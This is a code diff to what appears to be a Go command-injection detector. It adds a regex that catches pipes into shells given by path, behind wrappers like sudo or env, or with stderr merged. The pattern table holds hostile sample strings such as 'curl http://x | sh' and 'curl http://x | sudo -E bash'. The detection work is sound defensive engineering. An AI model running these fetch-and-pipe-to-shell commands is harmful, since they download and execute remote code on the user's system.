@@ -92,6 +92,10 @@ var CommandInjectionPatterns = []CommandInjectionPattern{
 	{regexp.MustCompile(`\|\s*curl\s+`), CmdCategoryPipe, 1.0, 0.95, "pipe_curl", "| curl -X POST"},
 	{regexp.MustCompile(`curl\s+[^|]+\|\s*(sh|bash)`), CmdCategoryPipe, 1.0, 0.99, "curl_pipe_shell", "curl http://x | sh"},
 	{regexp.MustCompile(`wget\s+[^|]+\|\s*(sh|bash)`), CmdCategoryPipe, 1.0, 0.99, "wget_pipe_shell", "wget http://x | sh"},
+	// A pipe into a shell spelled by path (| /bin/bash), behind a wrapper
+	// (| sudo -E bash, | env bash) or with stderr merged (|& sh). pipe_shell
+	// above needs the shell name right after the bar, so it misses all three.
+	{regexp.MustCompile(`(?i)\|&?\s*(?:\S*/)?(?:(?:sudo|doas|env|command|exec|nohup|nice|time|stdbuf|timeout)(?:\s+\S+)*?\s+(?:\S*/)?)?(?:sh|bash|zsh|csh|ksh|tcsh|fish|dash)(?:\s|$)`), CmdCategoryPipe, 1.0, 0.99, "pipe_shell_wrapped", "curl http://x | sudo -E bash"},
 
 	// ==========================================
 	// CATEGORY: Redirect Injection (20 patterns)
